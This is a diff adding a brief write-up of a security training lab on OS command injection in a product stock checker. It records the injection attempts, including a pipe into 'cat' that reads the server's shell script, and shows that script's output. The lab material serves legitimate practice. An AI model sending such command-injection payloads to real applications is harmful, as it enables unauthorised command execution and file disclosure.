@@ -1,0 +1,22 @@
+Lab: OS command injection, simple case
+
+This lab contains an OS command injection vulnerability in the product stock checker.
+
+The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
+
+To solve the lab, execute the whoami command to determine the name of the current user. 
+
+Analisis
+
+productId=1&storeId=1'--> sh: 2: Syntax error: Unterminated quoted string
+
+productId=1|whomai&storeId=1 -->sh: 1: whomai: not found /home/peter-w2S8LA/stockreport.sh: line 
+
+productId=1|cat+/home/peter-w2S8LA/stockreport.sh+#&storeId=1
+
+Response:
+#!/bin/bash
+
+set -eu
+
+eval cksum <<< "$1 $2" | cut -c 2-3 | rev | sed s/0/1/
